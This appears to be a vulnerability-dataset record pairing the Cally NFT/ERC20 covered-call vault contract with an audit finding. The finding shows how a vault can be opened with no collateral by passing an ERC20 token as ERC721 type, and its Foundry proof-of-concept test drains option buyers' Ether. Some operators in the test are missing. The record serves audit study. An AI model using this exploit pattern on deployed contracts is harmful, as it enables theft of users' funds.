[
    {
        "Code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (interfaces/IERC1363.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./IERC165.sol\";\n\ninterface IERC1363 is IERC165, IERC20 {\n    /*\n     * Note: the ERC-165 identifier for this interface is 0x4bbee2df.\n     * 0x4bbee2df ===\n     *   bytes4(keccak256('transferAndCall(address,uint256)')) ^\n     *   bytes4(keccak256('transferAndCall(address,uint256,bytes)')) ^\n     *   bytes4(keccak256('transferFromAndCall(address,address,uint256)')) ^\n     *   bytes4(keccak256('transferFromAndCall(address,address,uint256,bytes)'))\n     */\n\n    /*\n     * Note: the ERC-165 identifier for this interface is 0xfb9ec8ce.\n     * 0xfb9ec8ce ===\n     *   bytes4(keccak256('approveAndCall(address,uint256)')) ^\n     *   bytes4(keccak256('approveAndCall(address,uint256,bytes)'))\n     */\n\n    /**\n     * @dev Transfer tokens from `msg.sender` to another address and then call `onTransferReceived` on receiver\n     * @param to address The address which you want to transfer to\n     * @param value uint256 The amount of tokens to be transferred\n     * @return true unless throwing\n     */\n    function transferAndCall(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Transfer tokens from `msg.sender` to another address and then call `onTransferReceived` on receiver\n     * @param to address The address which you want to transfer to\n     * @param value uint256 The amount of tokens to be transferred\n     * @param data bytes Additional data with no specified format, sent in call to `to`\n     * @return true unless throwing\n     */\n    function transferAndCall(\n        address to,\n        uint256 value,\n        bytes memory data\n    ) external returns (bool);\n\n    /**\n     * @dev Transfer tokens from one address to another and then call `onTransferReceived` on receiver\n     * @param from address The address which you want to send tokens from\n     * @param to address The address which you want to transfer to\n     * @param value uint256 The amount of tokens to be transferred\n     * @return true unless throwing\n     */\n    function transferFromAndCall(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    /**\n     * @dev Transfer tokens from one address to another and then call `onTransferReceived` on receiver\n     * @param from address The address which you want to send tokens from\n     * @param to address The address which you want to transfer to\n     * @param value uint256 The amount of tokens to be transferred\n     * @param data bytes Additional data with no specified format, sent in call to `to`\n     * @return true unless throwing\n     */\n    function transferFromAndCall(\n        address from,\n        address to,\n        uint256 value,\n        bytes memory data\n    ) external returns (bool);\n\n    /**\n     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender\n     * and then call `onApprovalReceived` on spender.\n     * @param spender address The address which will spend the funds\n     * @param value uint256 The amount of tokens to be spent\n     */\n    function approveAndCall(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender\n     * and then call `onApprovalReceived` on spender.\n     * @param spender address The address which will spend the funds\n     * @param value uint256 The amount of tokens to be spent\n     * @param data bytes Additional data with no specified format, sent in call to `spender`\n     */\n    function approveAndCall(\n        address spender,\n        uint256 value,\n        bytes memory data\n    ) external returns (bool);\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\n/**\n\n\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2557     \u2588\u2588\u2557  \u2588\u2588\u2557   \u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551  \u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\n    \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   \u255a\u2588\u2588\u2588\u2588\u2554\u255d \n    \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551    \u255a\u2588\u2588\u2554\u255d  \n    \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551   \n     \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d   \n                                      \n\n    \n    NFT & ERC20 covered call vaults.\n    this is intended to be a public good.\n    pog pog pog.\n    \n\n*/\n\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/utils/ReentrancyGuard.sol\";\nimport \"openzeppelin/access/Ownable.sol\";\n\nimport \"./CallyNft.sol\";\n\n/// @title Cally - https://cally.finance\n/// @author out.eth\n/// @notice NFT & ERC20 covered call vaults\ncontract Cally is CallyNft, ReentrancyGuard, Ownable {\n    using SafeTransferLib for ERC20;\n    using SafeTransferLib for address payable;\n\n    /// @notice Fires when a new vault has been created\n    /// @param vaultId The newly minted vault NFT\n    /// @param from The account that created the vault\n    /// @param token The token address of the underlying asset\n    event NewVault(uint256 indexed vaultId, address indexed from, address indexed token);\n\n    /// @notice Fires when an option has been bought from a vault\n    /// @param optionId The newly minted option NFT\n    /// @param from The account that bought the option\n    /// @param token The token address of the underlying asset\n    event BoughtOption(uint256 indexed optionId, address indexed from, address indexed token);\n\n    /// @notice Fires when an option is exercised\n    /// @param optionId The option NFT which is being exercised\n    /// @param from The account that exercised the option\n    event ExercisedOption(uint256 indexed optionId, address indexed from);\n\n    /// @notice Fires when someone harvests their ETH balance\n    /// @param from The account that is harvesting\n    /// @param amount The amount of ETH which was harvested\n    event Harvested(address indexed from, uint256 amount);\n\n    /// @notice Fires when someone initiates a withdrawal on their vault\n    /// @param vaultId The vault NFT which is being withdrawn\n    /// @param from The account that is initiating the withdrawal\n    event InitiatedWithdrawal(uint256 indexed vaultId, address indexed from);\n\n    /// @notice Fires when someone withdraws their vault\n    /// @param vaultId The vault NFT which is being withdrawn\n    /// @param from The account that is withdrawing\n    event Withdrawal(uint256 indexed vaultId, address indexed from);\n\n    enum TokenType {\n        ERC721,\n        ERC20\n    }\n\n    struct Vault {\n        uint256 tokenIdOrAmount;\n        address token;\n        uint8 premiumIndex; // indexes into `premiumOptions`\n        uint8 durationDays; // days\n        uint8 dutchAuctionStartingStrikeIndex; // indexes into `strikeOptions`\n        uint32 currentExpiration;\n        bool isExercised;\n        bool isWithdrawing;\n        TokenType tokenType;\n        uint256 currentStrike;\n        uint256 dutchAuctionReserveStrike;\n    }\n\n    uint32 public constant AUCTION_DURATION = 24 hours;\n\n    // prettier-ignore\n    uint256[] public premiumOptions = [0.01 ether, 0.025 ether, 0.05 ether, 0.075 ether, 0.1 ether, 0.25 ether, 0.5 ether, 0.75 ether, 1.0 ether, 2.5 ether, 5.0 ether, 7.5 ether, 10 ether, 25 ether, 50 ether, 75 ether, 100 ether];\n    // prettier-ignore\n    uint256[] public strikeOptions = [1 ether, 2 ether, 3 ether, 5 ether, 8 ether, 13 ether, 21 ether, 34 ether, 55 ether, 89 ether, 144 ether, 233 ether, 377 ether, 610 ether, 987 ether, 1597 ether, 2584 ether, 4181 ether, 6765 ether];\n\n    uint256 public feeRate = 0;\n    uint256 public protocolUnclaimedFees = 0;\n\n    /// @notice The current vault index. Used for determining which\n    ///         tokenId to use when minting a new vault. Increments by\n    ///         2 on each new mint.\n    uint256 public vaultIndex = 1;\n\n    /// @notice Mapping of vault tokenId -> vault information\n    mapping(uint256 => Vault) private _vaults;\n\n    /// @notice Mapping of vault tokenId -> vault beneficiary.\n    ///         Beneficiary is credited the premium when option is\n    ///         purchased or strike ETH when option is exercised.\n    mapping(uint256 => address) private _vaultBeneficiaries;\n\n    /// @notice The unharvested ethBalance of each account\n    mapping(address => uint256) public ethBalance;\n\n    /*********************\n        ADMIN FUNCTIONS\n    **********************/\n\n    /// @notice Sets the fee that is applied on exercise\n    /// @param feeRate_ The new fee rate: fee = 1% = (1 / 100) * 1e18\n    function setFee(uint256 feeRate_) external onlyOwner {\n        feeRate = feeRate_;\n    }\n\n    /// @notice Withdraws the protocol fees and sends to current owner\n    function withdrawProtocolFees() external onlyOwner returns (uint256 amount) {\n        amount = protocolUnclaimedFees;\n        protocolUnclaimedFees = 0;\n        payable(msg.sender).safeTransferETH(amount);\n    }\n\n    /**************************\n        MAIN LOGIC FUNCTIONS\n    ***************************/\n\n    /*\n        standard lifecycle:\n            createVault\n            buyOption (repeats)\n            exercise\n            initiateWithdraw\n            withdraw\n\n        [*] setVaultBeneficiary\n        [*] harvest\n\n        [*] can be called anytime in lifecycle\n    */\n\n    /// @notice Creates a new vault that perpetually sells calls\n    ///         on the underlying assets until a call option is exercised\n    ///         or the owner initiates a withdrawal.\n    /// @param tokenIdOrAmount The tokenId (NFT) or amount (ERC20) to vault\n    /// @param token The address of the NFT or ERC20 contract to vault\n    /// @param premiumIndex The index into the premiumOptions of each call that is sold\n    /// @param durationDays The length/duration of each call that is sold in days\n    /// @param dutchAuctionStartingStrikeIndex The index into the strikeOptions for the starting strike for each dutch auction\n    /// @param dutchAuctionReserveStrike The reserve strike for each dutch auction\n    /// @param tokenType The type of the underlying asset (NFT or ERC20)\n    function createVault(\n        uint256 tokenIdOrAmount,\n        address token,\n        uint8 premiumIndex,\n        uint8 durationDays,\n        uint8 dutchAuctionStartingStrikeIndex,\n        uint256 dutchAuctionReserveStrike,\n        TokenType tokenType\n    ) external returns (uint256 vaultId) {\n        require(premiumIndex < premiumOptions.length, \"Invalid premium index\");\n        require(dutchAuctionStartingStrikeIndex < strikeOptions.length, \"Invalid strike index\");\n        require(dutchAuctionReserveStrike < strikeOptions[dutchAuctionStartingStrikeIndex], \"Reserve strike too small\");\n        require(durationDays > 0, \"durationDays too small\");\n        require(tokenType == TokenType.ERC721 || tokenType == TokenType.ERC20, \"Invalid token type\");\n\n        Vault memory vault = Vault({\n            tokenIdOrAmount: tokenIdOrAmount,\n            token: token,\n            premiumIndex: premiumIndex,\n            durationDays: durationDays,\n            dutchAuctionStartingStrikeIndex: dutchAuctionStartingStrikeIndex,\n            currentExpiration: uint32(block.timestamp),\n            isExercised: false,\n            isWithdrawing: false,\n            tokenType: tokenType,\n            currentStrike: 0,\n            dutchAuctionReserveStrike: dutchAuctionReserveStrike\n        });\n\n        // vault index should always be odd\n        vaultIndex += 2;\n        vaultId = vaultIndex;\n        _vaults[vaultId] = vault;\n\n        // give msg.sender vault token\n        _mint(msg.sender, vaultId);\n\n        emit NewVault(vaultId, msg.sender, token);\n\n        // transfer the NFTs or ERC20s to the contract\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(msg.sender, address(this), vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransferFrom(msg.sender, address(this), vault.tokenIdOrAmount);\n    }\n\n    /// @notice Buys an option from a vault at a fixed premium and variable strike\n    ///         which is dependent on the dutch auction. Premium is credited to\n    ///         vault beneficiary.\n    /// @param vaultId The tokenId of the vault to buy the option from\n    function buyOption(uint256 vaultId) external payable returns (uint256 optionId) {\n        Vault memory vault = _vaults[vaultId];\n\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check vault exists\n        require(ownerOf(vaultId) != address(0), \"Vault does not exist\");\n\n        // check that the vault still has the NFTs as collateral\n        require(vault.isExercised == false, \"Vault already exercised\");\n\n        // check that the vault is not in withdrawing state\n        require(vault.isWithdrawing == false, \"Vault is being withdrawn\");\n\n        // check enough eth was sent to cover premium\n        uint256 premium = getPremium(vaultId);\n        require(msg.value >= premium, \"Incorrect ETH amount sent\");\n\n        // check option associated with the vault has expired\n        uint32 auctionStartTimestamp = vault.currentExpiration;\n        require(block.timestamp >= auctionStartTimestamp, \"Auction not started\");\n\n        // set new currentStrike\n        vault.currentStrike = getDutchAuctionStrike(\n            strikeOptions[vault.dutchAuctionStartingStrikeIndex],\n            vault.currentExpiration + AUCTION_DURATION,\n            vault.dutchAuctionReserveStrike\n        );\n\n        // set new expiration\n        vault.currentExpiration = uint32(block.timestamp) + (vault.durationDays * 1 days);\n\n        // update the vault with the new option expiration and strike\n        _vaults[vaultId] = vault;\n\n        // force transfer the vault's associated option from old owner to new owner\n        // option id for a respective vault is always vaultId + 1\n        optionId = vaultId + 1;\n        _forceTransfer(msg.sender, optionId);\n\n        // increment vault beneficiary's unclaimed premiums\n        address beneficiary = getVaultBeneficiary(vaultId);\n        ethBalance[beneficiary] += msg.value;\n\n        emit BoughtOption(optionId, msg.sender, vault.token);\n    }\n\n    /// @notice Exercises a call option and sends the underlying assets to the\n    ///         exerciser and the strike ETH to the vault beneficiary.\n    /// @param optionId The tokenId of the option to exercise\n    function exercise(uint256 optionId) external payable {\n        // optionId should always be even\n        require(optionId % 2 == 0, \"Not option type\");\n\n        // check owner\n        require(msg.sender == ownerOf(optionId), \"You are not the owner\");\n\n        uint256 vaultId = optionId - 1;\n        Vault memory vault = _vaults[vaultId];\n\n        // check option hasn't expired\n        require(block.timestamp < vault.currentExpiration, \"Option has expired\");\n\n        // check correct ETH amount was sent to pay the strike\n        require(msg.value == vault.currentStrike, \"Incorrect ETH sent for strike\");\n\n        // burn the option token\n        _burn(optionId);\n\n        // mark the vault as exercised\n        vault.isExercised = true;\n        _vaults[vaultId] = vault;\n\n        // collect protocol fee\n        uint256 fee = 0;\n        if (feeRate > 0) {\n            fee = (msg.value * feeRate) / 1e18;\n            protocolUnclaimedFees += fee;\n        }\n\n        // increment vault beneficiary's ETH balance\n        ethBalance[getVaultBeneficiary(vaultId)] += msg.value - fee;\n\n        emit ExercisedOption(optionId, msg.sender);\n\n        // transfer the NFTs or ERC20s to the exerciser\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n    }\n\n    /// @notice Initiates a withdrawal so that the vault will no longer sell\n    ///         another call once the currently active call option has expired.\n    /// @param vaultId The tokenId of the vault to initiate a withdrawal on\n    function initiateWithdraw(uint256 vaultId) external {\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check msg.sender owns the vault\n        require(msg.sender == ownerOf(vaultId), \"You are not the owner\");\n\n        _vaults[vaultId].isWithdrawing = true;\n\n        emit InitiatedWithdrawal(vaultId, msg.sender);\n    }\n\n    /// @notice Sends the underlying assets back to the vault owner and claims any\n    ///         unharvested premiums for the owner. Vault and it's associated option\n    ///         NFT are burned.\n    /// @param vaultId The tokenId of the vault to withdraw\n    function withdraw(uint256 vaultId) external nonReentrant {\n        // vaultId should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n\n        // check owner\n        require(msg.sender == ownerOf(vaultId), \"You are not the owner\");\n\n        Vault memory vault = _vaults[vaultId];\n\n        // check vault can be withdrawn\n        require(vault.isExercised == false, \"Vault already exercised\");\n        require(vault.isWithdrawing, \"Vault not in withdrawable state\");\n        require(block.timestamp > vault.currentExpiration, \"Option still active\");\n\n        // burn option and vault\n        uint256 optionId = vaultId + 1;\n        _burn(optionId);\n        _burn(vaultId);\n\n        emit Withdrawal(vaultId, msg.sender);\n\n        // claim any ETH still in the account\n        harvest();\n\n        // transfer the NFTs or ERC20s back to the owner\n        vault.tokenType == TokenType.ERC721\n            ? ERC721(vault.token).transferFrom(address(this), msg.sender, vault.tokenIdOrAmount)\n            : ERC20(vault.token).safeTransfer(msg.sender, vault.tokenIdOrAmount);\n    }\n\n    /// @notice Sets the vault beneficiary that will receive premiums/strike ETH from the vault\n    /// @param vaultId The tokenId of the vault to update\n    /// @param beneficiary The new vault beneficiary\n    function setVaultBeneficiary(uint256 vaultId, address beneficiary) external {\n        // vaultId's should always be odd\n        require(vaultId % 2 != 0, \"Not vault type\");\n        require(msg.sender == ownerOf(vaultId), \"Not owner\");\n\n        _vaultBeneficiaries[vaultId] = beneficiary;\n    }\n\n    /// @notice Sends any unclaimed ETH (premiums/strike) to the msg.sender\n    function harvest() public returns (uint256 amount) {\n        // reset premiums\n        amount = ethBalance[msg.sender];\n        ethBalance[msg.sender] = 0;\n\n        emit Harvested(msg.sender, amount);\n\n        // transfer premiums to owner\n        payable(msg.sender).safeTransferETH(amount);\n    }\n\n    /**********************\n        GETTER FUNCTIONS\n    ***********************/\n\n    /// @notice Get the current beneficiary for a vault\n    /// @param vaultId The tokenId of the vault to fetch the beneficiary for\n    /// @return beneficiary The beneficiary for the vault\n    function getVaultBeneficiary(uint256 vaultId) public view returns (address beneficiary) {\n        address currentBeneficiary = _vaultBeneficiaries[vaultId];\n\n        // return the current owner if vault beneficiary is not set\n        return currentBeneficiary == address(0) ? ownerOf(vaultId) : currentBeneficiary;\n    }\n\n    /// @notice Get details for a vault\n    /// @param vaultId The tokenId of the vault to fetch the details for\n    function vaults(uint256 vaultId) external view returns (Vault memory) {\n        return _vaults[vaultId];\n    }\n\n    /// @notice Get the fixed option premium for a vault\n    /// @param vaultId The tokenId of the vault to fetch the premium for\n    /// @return premium The premium for the vault\n    function getPremium(uint256 vaultId) public view returns (uint256 premium) {\n        Vault memory vault = _vaults[vaultId];\n        return premiumOptions[vault.premiumIndex];\n    }\n\n    /// @notice Get the current dutch auction strike for a start value and end\n    ///         timestamp. Strike decreases exponentially to 0 over time starting\n    ///         at startingStrike. Minimum value returned is reserveStrike.\n    /// @param startingStrike The starting strike value\n    /// @param auctionEndTimestamp The unix timestamp when the auction ends\n    /// @param reserveStrike The minimum value for the strike\n    /// @return strike The strike\n    function getDutchAuctionStrike(\n        uint256 startingStrike,\n        uint32 auctionEndTimestamp,\n        uint256 reserveStrike\n    ) public view returns (uint256 strike) {\n        /*\n            delta = max(auctionEnd - currentTimestamp, 0)\n            progress = delta / auctionDuration\n            auctionStrike = progress^2 * startingStrike\n            strike = max(auctionStrike, reserveStrike)\n        */\n        uint256 delta = auctionEndTimestamp > block.timestamp ? auctionEndTimestamp - block.timestamp : 0;\n        uint256 progress = (1e18 * delta) / AUCTION_DURATION;\n        uint256 auctionStrike = (progress * progress * startingStrike) / (1e18 * 1e18);\n\n        // max(auctionStrike, reserveStrike)\n        strike = auctionStrike > reserveStrike ? auctionStrike : reserveStrike;\n    }\n\n    /*************************\n        OVVERIDES FUNCTIONS\n    **************************/\n\n    /// @dev Resets the beneficiary address when transferring vault NFTs.\n    ///      The new beneficiary will be the account receiving the vault NFT.\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public override {\n        require(from == _ownerOf[id], \"WRONG_FROM\");\n        require(to != address(0), \"INVALID_RECIPIENT\");\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender] || msg.sender == getApproved[id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        // reset the beneficiary\n        bool isVaultToken = id % 2 != 0;\n        if (isVaultToken) {\n            _vaultBeneficiaries[id] = address(0);\n        }\n\n        _ownerOf[id] = to;\n        delete getApproved[id];\n\n        emit Transfer(from, to, id);\n    }\n\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        require(_ownerOf[tokenId] != address(0), \"URI query for NOT_MINTED token\");\n\n        bool isVaultToken = tokenId % 2 != 0;\n        Vault memory vault = _vaults[isVaultToken ? tokenId : tokenId - 1];\n\n        string memory jsonStr = renderJson(\n            vault.token,\n            vault.tokenIdOrAmount,\n            getPremium(vault.premiumIndex),\n            vault.durationDays,\n            strikeOptions[vault.dutchAuctionStartingStrikeIndex],\n            vault.currentExpiration,\n            vault.currentStrike,\n            vault.isExercised,\n            isVaultToken\n        );\n\n        return string(abi.encodePacked(\"data:application/json;base64,\", Base64.encode(bytes(jsonStr))));\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../../utils/introspection/IERC165.sol\";\n\n/**\n * @dev Required interface of an ERC1155 compliant contract, as defined in the\n * https://eips.ethereum.org/EIPS/eip-1155[EIP].\n *\n * _Available since v3.1._\n */\ninterface IERC1155 is IERC165 {\n    /**\n     * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.\n     */\n    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);\n\n    /**\n     * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all\n     * transfers.\n     */\n    event TransferBatch(\n        address indexed operator,\n        address indexed from,\n        address indexed to,\n        uint256[] ids,\n        uint256[] values\n    );\n\n    /**\n     * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to\n     * `approved`.\n     */\n    event ApprovalForAll(address indexed account, address indexed operator, bool approved);\n\n    /**\n     * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.\n     *\n     * If an {URI} event was emitted for `id`, the standard\n     * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value\n     * returned by {IERC1155MetadataURI-uri}.\n     */\n    event URI(string value, uint256 indexed id);\n\n    /**\n     * @dev Returns the amount of tokens of token type `id` owned by `account`.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function balanceOf(address account, uint256 id) external view returns (uint256);\n\n    /**\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {balanceOf}.\n     *\n     * Requirements:\n     *\n     * - `accounts` and `ids` must have the same length.\n     */\n    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\n        external\n        view\n        returns (uint256[] memory);\n\n    /**\n     * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,\n     *\n     * Emits an {ApprovalForAll} event.\n     *\n     * Requirements:\n     *\n     * - `operator` cannot be the caller.\n     */\n    function setApprovalForAll(address operator, bool approved) external;\n\n    /**\n     * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.\n     *\n     * See {setApprovalForAll}.\n     */\n    function isApprovedForAll(address account, address operator) external view returns (bool);\n\n    /**\n     * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.\n     *\n     * Emits a {TransferSingle} event.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - If the caller is not `from`, it must be have been approved to spend ``from``'s tokens via {setApprovalForAll}.\n     * - `from` must have a balance of tokens of type `id` of at least `amount`.\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the\n     * acceptance magic value.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes calldata data\n    ) external;\n\n    /**\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.\n     *\n     * Emits a {TransferBatch} event.\n     *\n     * Requirements:\n     *\n     * - `ids` and `amounts` must have the same length.\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the\n     * acceptance magic value.\n     */\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] calldata ids,\n        uint256[] calldata amounts,\n        bytes calldata data\n    ) external;\n}\n\n\n",
        "CodeNames": [
            "IERC1363.sol",
            "Cally.sol",
            "IERC1155.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\n// CreateVault.t.sol\n    function testStealFunds() public {\n        // address of 0x on mainnet\n        address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n        vm.startPrank(babe);\n        require(ERC20(t).balanceOf(babe) == 0);\n        uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);\n        // check that neither the Cally contract nor the vault creator\n        // had any 0x tokens\n        require(ERC20(t).balanceOf(babe) == 0);\n        require(ERC20(t).balanceOf(address(c)) == 0);\n\n        // check whether vault was created properly\n        Cally.Vault memory v = c.vaults(vaultId);\n        require(v.token == t);\n        require(v.tokenIdOrAmount == 100);\n        vm.stopPrank();\n        // So now there's a vault for 100 0x tokens although the Cally contract doesn't\n        // have any.\n        // If someone buys & exercises the option they won't receive any tokens.\n        uint premium = 0.025 ether;\n        uint strike = 2 ether;\n        require(address(c).balance == 0, \"shouldn't have any balance at the beginning\");\n        require(payable(address(this)).balance  0, \"not enough balance\");\n\n        uint optionId = c.buyOption{value: premium}(vaultId);\n        c.exercise{value: strike}(optionId);\n\n        // buyer of option (`address(this)`) got zero 0x tokens\n        // But buyer lost their Ether\n        require(ERC20(t).balanceOf(address(this)) == 0);\n        require(address(c).balance  0, \"got some money\");\n    }\n"
                ],
                "Type": " no-revert-on-transfer ERC20 tokens can be drained",
                "Description": "\n<https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L198-L200\n\n\nSome ERC20 tokens don't throw but just return false when a transfer fails. This can be abused to trick the createVault() function to initialize the vault without providing any tokens. A good example of such a token is *ZRX*: Etherscan code(https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64)\n\nWhen such a vault is initialized, another user can both buy and exercise the option without ever receiving any funds. The creator of the vault does receive the buyer's Ether tho. So it can cause a loss of funds.\n\n\nThe trick is to create a vault with an ERC20 token but use ERC721 as the vault's type. Then, instead of calling safeTransferFrom() the function calls transferFrom() which won't catch the token returning false.\n\nHere's a test that showcases the issue:\n\nsolidity\n// CreateVault.t.sol\n    function testStealFunds() public {\n        // address of 0x on mainnet\n        address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n        vm.startPrank(babe);\n        require(ERC20(t).balanceOf(babe) == 0);\n        uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);\n        // check that neither the Cally contract nor the vault creator\n        // had any 0x tokens\n        require(ERC20(t).balanceOf(babe) == 0);\n        require(ERC20(t).balanceOf(address(c)) == 0);\n\n        // check whether vault was created properly\n        Cally.Vault memory v = c.vaults(vaultId);\n        require(v.token == t);\n        require(v.tokenIdOrAmount == 100);\n        vm.stopPrank();\n        // So now there's a vault for 100 0x tokens although the Cally contract doesn't\n        // have any.\n        // If someone buys & exercises the option they won't receive any tokens.\n        uint premium = 0.025 ether;\n        uint strike = 2 ether;\n        require(address(c).balance == 0, \"shouldn't have any balance at the beginning\");\n        require(payable(address(this)).balance  0, \"not enough balance\");\n\n        uint optionId = c.buyOption{value: premium}(vaultId);\n        c.exercise{value: strike}(optionId);\n\n        // buyer of option (address(this)) got zero 0x tokens\n        // But buyer lost their Ether\n        require(ERC20(t).balanceOf(address(this)) == 0);\n        require(address(c).balance  0, \"got some money\");\n    }\n\n\nTo run it, you need to use forge's forking mode: forge test --fork-url <alchemy/infura URL --match testStealFunds\n\n",
                "Repair": "\nI think the easiest solution is to use safeTransferFrom() when the token is of type ERC721. Since the transfer is at the end of the function there shouldn't be any risk of reentrancy. If someone passes an ERC20 address with type ERC721, the safeTransferFrom() call would simply fail since that function signature shouldn't exist on ERC20 tokens.\n\noutdoteth (Cally) confirmed and resolved(https://github.com/code-423n4/2022-05-cally-findings/issues/89#issuecomment-1128776685):\n  the fix for this issue is here; https://github.com/outdoteth/cally/pull/4\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-05-cally-findings/issues/89#issuecomment-1130790694):\n  This is a great report. I appreciate the clear test showcasing the issue well, and using a real token example.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: Unlicense\npragma solidity >=0.6.0 <0.9.0;\n\nimport \"../Test.sol\";\n\ncontract StdCheatsTest is Test {\n    Bar test;\n    \n    function setUp() public {\n        test = new Bar();\n    }\n\n    function testSkip() public {\n        vm.warp(100);\n        skip(25);\n        assertEq(block.timestamp, 125);\n    }\n\n    function testRewind() public {\n        vm.warp(100);\n        rewind(25);\n        assertEq(block.timestamp, 75);\n    }\n\n    function testHoax() public {\n        hoax(address(1337));\n        test.bar{value: 100}(address(1337));\n    }\n\n    function testHoaxOrigin() public {\n        hoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n    }\n\n    function testHoaxDifferentAddresses() public {\n        hoax(address(1337), address(7331));\n        test.origin{value: 100}(address(1337), address(7331));\n    }\n\n    function testStartHoax() public {\n        startHoax(address(1337));\n        test.bar{value: 100}(address(1337));\n        test.bar{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function testStartHoaxOrigin() public {\n        startHoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n        test.origin{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function testDeal() public {\n        deal(address(this), 1 ether);\n        assertEq(address(this).balance, 1 ether);\n    }\n\n    function testDealToken() public {\n        Bar barToken = new Bar();\n        address bar = address(barToken);\n        deal(bar, address(this), 10000e18);\n        assertEq(barToken.balanceOf(address(this)), 10000e18);\n    }\n\n    function testDealTokenAdjustTS() public {\n        Bar barToken = new Bar();\n        address bar = address(barToken);\n        deal(bar, address(this), 10000e18, true);\n        assertEq(barToken.balanceOf(address(this)), 10000e18);\n        assertEq(barToken.totalSupply(), 20000e18);\n        deal(bar, address(this), 0, true);\n        assertEq(barToken.balanceOf(address(this)), 0);\n        assertEq(barToken.totalSupply(), 10000e18);\n    }\n\n    function testDeployCode() public {\n        address deployed = deployCode(\"StdCheats.t.sol:StdCheatsTest\", bytes(\"\"));\n        assertEq(string(getCode(deployed)), string(getCode(address(this))));\n    }\n\n    function testDeployCodeNoArgs() public {\n        address deployed = deployCode(\"StdCheats.t.sol:StdCheatsTest\");\n        assertEq(string(getCode(deployed)), string(getCode(address(this))));\n    }\n\n    function getCode(address who) internal view returns (bytes memory o_code) {\n        assembly {\n            // retrieve the size of the code, this needs assembly\n            let size := extcodesize(who)\n            // allocate output byte array - this could also be done 